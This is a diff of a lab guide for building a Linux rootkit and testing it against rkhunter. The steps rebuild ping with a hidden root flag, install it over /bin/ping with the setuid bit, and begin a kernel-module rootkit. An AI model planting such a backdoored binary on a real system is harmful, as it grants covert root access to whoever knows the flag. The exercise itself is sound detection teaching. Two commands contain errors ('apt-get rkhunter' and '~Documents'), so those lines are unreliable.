@@ -1,19 +1,25 @@
 # Step 0 Prepare Kernel/VM
 
-Downgrade Kernel via script
-Reboot/Start with lower Kernel [Press ESC for selection]
-Gasterweiterung installieren (sudo apt-get install virtualbox-guest-addition-iso)
-Install vim
-To the ~/.vimrc add 
+#Downgrade Kernel via script
+#Reboot/Start with lower Kernel [Press ESC for selection]
+#Gasterweiterung installieren 
+    sudo apt-get install virtualbox-guest-addition-iso
+#Install vim
+    sudo apt-get install vim
+#To the ~/.vimrc add 
     set mouse=a
 
 
 # Setp 1 Install and Run rkhunter
 
-Install RootkitHunter (rkhunter) with Local Mail
-Update rkhunter DB : sudo rkhunter --update
-Scan : sudo rkhunter -c
-Copy log from /var/log/rkhunter.log to some safe place (e.g. cp /var/log/rkhunter.log ~/step1.log)
+#Install RootkitHunter (rkhunter) with Local Mail
+    sudo apt-get rkhunter
+#Update rkhunter DB : 
+    sudo rkhunter --update
+#Scan (Interactive): 
+    sudo rkhunter -c
+#Copy log from /var/log/rkhunter.log to some safe place 
+    cp /var/log/rkhunter.log ~/step1.log
 
 # Step 2 Build/Install Rootkit
 
@@ -36,7 +42,8 @@ Copy log from /var/log/rkhunter.log to some safe place (e.g. cp /var/log/rkhunte
 # build may complain about missing keys this is not a problem just ignore it
     dpkg-buildpackage
 
-#edit ping/ping.c
+#edit ping/ping.c using an editor of choise
+    vim ping/ping.c
 #add to the end of the unnamed? enum:
 
 ARG_ROOT_PLS
@@ -70,15 +77,22 @@ case ARG_ROOT_PLS:
 #run ping with special flag
     ping --rtpls
 
+#make a backup of the original ping (just in case)
+    cp /bin/ping ~/Documents/ping.bak
 #replace /bin/ping with our ping command
     sudo cp ping/ping /bin/ping
-#make sure it hase the setuid bit set
+#make sure it hase the setuid bit set (should not be necessary)
     sudo chmod u+s /bin/ping
 
 #run rkhunter again
     sudo rkhunter -c
+    
+#compare logs of rkhunter
 
-# Step 3 Rootkit
+# Step 3 Rootkit/Kernelmodule
+
+#switch to a new/empty directory
+    mkdir -p ~/Documents/Rootkit && cd ~Documents/Rootkit
 
 #install headers
     sudo apt-get install linux-headers-$(uname -r)
@@ -99,6 +113,6 @@ case ARG_ROOT_PLS:
 #Show Messages (add -w to display messages as they come in) (show.sh uses -w flag)
     dmesg -k
 
-#To Recompile and (re)load the module you can use the replace.sh skript
+#To Recompile and (re)load the module you can use the replace.sh script
 
 
